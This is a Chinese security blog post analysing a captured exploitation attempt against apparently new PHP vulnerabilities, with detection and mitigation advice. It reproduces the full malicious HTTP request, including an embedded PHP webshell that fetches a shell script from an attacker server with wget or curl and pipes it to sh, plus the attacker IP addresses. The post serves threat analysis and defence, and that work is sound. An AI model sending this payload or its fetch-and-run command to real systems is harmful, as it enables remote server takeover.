#  捕获 PHP2Shell 攻击载荷：当漏洞利用开始“下载执行”  
原创 小话安全
                    小话安全  小话安全   2026-10-23 16:00  
  
2026 年 10 月 21 日 14:00 UTC，PHP 官方发布了 CVE-2026-109618 与 CVE-2026-109619 的紧急修复。14:19 UTC，watchTowr 记录到了第一波主动利用尝试。  
  
我抓到的这条载荷，就出现在这个窗口期里。它不再是一天前那种依赖应用层脆弱类的序列化试探，而是一条完整的、从远程拉取并执行 shell 脚本的武器化利用链。  
## 载荷  
```
POST /index.php HTTP/1.1      
Content-Type: multipart/form-data; boundary=WebKitFormBoundary7gk9xgqa      
Content-Length: 18939      
Cookie: PHPSESSID=zObFPK2T6ZLxhNZzYuiFf42-RL2jp20F      
X-Forwarded-For: 77.90.[185].20      
------WebKitFormBoundary7gk9xgqa     
Content-Disposition: form-data; name=”PHPSESSID”      
zObFPK2T6ZLxhNZzYuiFf42-RL2jp20F
      
------WebKitFormBoundary7gk9xgqa     
Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS”       
      
<?php echo '__START__'; system('(wget --no-check-certificate -qO- https://217.60.102.5/sh || curl -sk https://217.60.102.5/sh) | sh -s php2shell'); echo '__END__';?>
      
------WebKitFormBoundary7gk9xgqa      
Content-Disposition: form-data; name=”pad_0”
      
（数十个随机字符串字段，每个约 60 字节）
      
...
      
------WebKitFormBoundary7gk9xgqa      
Content-Disposition: form-data; name=”file”; filename=”data.bin”      
Content-Type: application/octet-stream      
（约 1.7KB 随机二进制数据）
      
------WebKitFormBoundary7gk9xgqa--
    
  
```  
## 这条载荷和之前的不一样  
  
之前那条 |O:6:"Logger":... 依赖目标应用恰好存在一个带危险魔术方法的类。那是  
碰运气，成本低，成功率也低。  
  
这条变了。PHP_SESSION_UPLOAD_PROGRESS 字段里直接嵌入了一段  
PHP webshell，逻辑清晰得刺眼：从 217.60.[102].5 拉取一个 shell 脚本，管道交给 sh 执行，参数是 php2shell。  
START 和   
END 是攻击者用来判断命令是否回显成功的标记。  
  
但真正值得关注的是那些 pad_ 字段和 data.bin。根据安全内参的分析，CVE-2026-109618 的触发需要精确控制 multipart 请求体的内存布局。攻击者利用 multipart 解析中的几个缺陷——无 Content-Length 的请求可以绕过 post_max_size 初检、单个段可以容纳不限数量的头部、空文件控件不计入 max_file_uploads 却照样生成元数据——来把内存消耗“撑”到恰好触及 memory_limit 的边界。大量固定长度的 pad 字段就是为了让内存分配落在预期的尺寸类里，触发 OOM 路径中的 longjmp() 状态残留。  
  
换句话说，这条载荷同时在做两件事：投递 webshell 到会话文件（依赖应用存在 LFI），以及尝试触发内核层的 OOM 内存破坏（  
不依赖应用代码）。  
## 为什么打 /index.php  
  
根据白帽汇的测绘数据，这次漏洞影响范围覆盖了 WordPress、Drupal、Joomla、Laravel 等主流 PHP 应用，全球仅 WordPress 资产就超过 7200 万。但攻击者选择 /index.php，不是因为 Joomla 或 WordPress 的 index.php 里有什么特殊代码。  
  
安全内参的分析明确指出：CVE-2026-109618 的触发发生在  
Apache mod_php 的请求启动阶段，早于任何应用代码执行。PHP 官方确认，mod_php 在请求启动失败后仍会无条件执行 shutdown 流程，而 shutdown 阶段会把 OOM 中断后留下的无效状态当作有效数据消费。攻击发生在 RINIT 之前，应用脚本甚至没有开始运行。  
  
这意味着：你的 index.php 写得多安全，都不影响这条攻击链。只要它被 vulnerable 的 PHP 解析，条件就满足了。CrowdStrike 的说法更直白：攻击没有认证要绕过，没有会话要窃取，没有漏洞端点要发现。暴露面与 CMS、框架、插件无关。工作进程保持稳定，服务器返回 HTTP 200，应用日志不记录任何异常，因为  
应用代码从未执行。  
  
服务端唯一的痕迹，是 Web 服务器错误日志里一条内存超限的致命报错——通常会被当作噪音忽略。  
## 攻击者的来源  
  
77.90.[185].20 不是一个陌生的地址。AbuseIPDB 的记录显示，该 IP 累计被报告超过 4.3 万次，主要涉及 SSH 暴力破解和 Web 应用攻击。IPThreat 和 Blocklist.de 也将其标记为活跃的攻击源，涉及 SSH 暴力破解和蜜罐交互。  
  
载荷中引用的 217.60.102.5 是攻击者的载荷分发服务器。这条载荷的构造方式——wget/curl 双保险、管道直接交给 sh、php2shell 标记——与公开的 PoC 利用链特征吻合。CERT.UG 在补丁发布当天就将威胁等级定为 Red，确认两个 CVE 均已在野被积极利用。  
## 如果你看到了类似的流量  
  
首先确认 PHP 版本。修复版本是 8.2.35、8.3.36、8.4.27、8.5.12。低于这些版本的，都在受影响范围内。  
  
其次，如果暂时无法升级，关闭session.upload_progress。多个分析确认这一配置可以阻断至少一条已知的会话投毒路径。但需要说清楚：CVE-2026-109618 的 OOM 触发  
不依赖session.upload_progress 是否开启。关闭它降低了部分攻击面的成功率，不是完整修复。Mallory 的分析也指出，这些临时措施的有效性未经官方确认，不能替代补丁。  
  
第三，检查 Apache mod_php 的错误日志。CrowdStrike 提到的那条“内存超限致命报错”是唯一可能留下的痕迹。搜索包含 Allowed memory size exhausted 或 Fatal error 的条目，尤其是那些与来自异常 IP 的 multipart POST 请求关联的。  
  
第四，检查会话文件。搜索 session.save_path 目录下是否存在以请求中 PHPSESSID 命名的文件，内容是否包含   
START、system、或 217.60.102.5。  
  
第五，阻断77.90.[185].20和217.60.[102].5。  
## 时间线已经失效  
  
亚马逊威胁情报团队披露，他们在 10 月 17 日——漏洞仍处于保密期时——就在 MadPot 蜜罐中观测到了针对 PHP2Shell 的利用尝试。Cloudflare 的数据显示，公告发布后 45 分钟内攻击量升至数万次，两小时内达到数十万次，截至目前总量已突破数百万次。  
  
传统的 7 天、30 天修复窗口，默认前提是攻击者不会立刻利用漏洞。这个前提在这件事上不成立。Freebuf 的报道引述亚马逊的建议：补丁响应的时间线应当以小时为单位计算。  
  
那条 18KB 的请求，带着数十个随机填充字段和一个 1.7KB 的二进制文件，最终可能只换来一个 404。但攻击者扔出它的成本，几乎为零。已经有无数条类似的请求，正在被扔向互联网上每一个还跑着 vulnerable PHP 的 /index.php。  
  
（文中涉及的攻击载荷来自真实流量捕获，已做脱敏处理。IP 地址和域名仅用于威胁情报关联，请勿直接访问。）  
  
